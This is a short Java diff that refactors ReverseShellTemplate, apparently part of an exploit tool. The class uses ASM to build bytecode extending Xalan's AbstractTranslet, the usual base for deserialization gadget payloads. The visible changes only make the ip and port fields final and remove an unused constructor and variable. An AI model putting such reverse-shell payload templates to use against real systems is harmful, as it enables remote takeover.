@@ -8,12 +8,8 @@ import static org.objectweb.asm.Opcodes.*;
 public class ReverseShellTemplate implements Template {
     private String className;
     private byte[] bytes;
-    private String ip;
-    private int port;
-
-    public ReverseShellTemplate(String ip, String port) {
-        this(ip, Integer.parseInt(port));
-    }
+    private final String ip;
+    private final int port;
 
 
     public ReverseShellTemplate(String ip, int port) {
@@ -46,7 +42,6 @@ public class ReverseShellTemplate implements Template {
         ClassWriter cw = new ClassWriter(0);
         FieldVisitor fv;
         MethodVisitor mv;
-        AnnotationVisitor av0;
 
         cw.visit(V1_6, ACC_PUBLIC + ACC_SUPER, className, null, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", null);
 
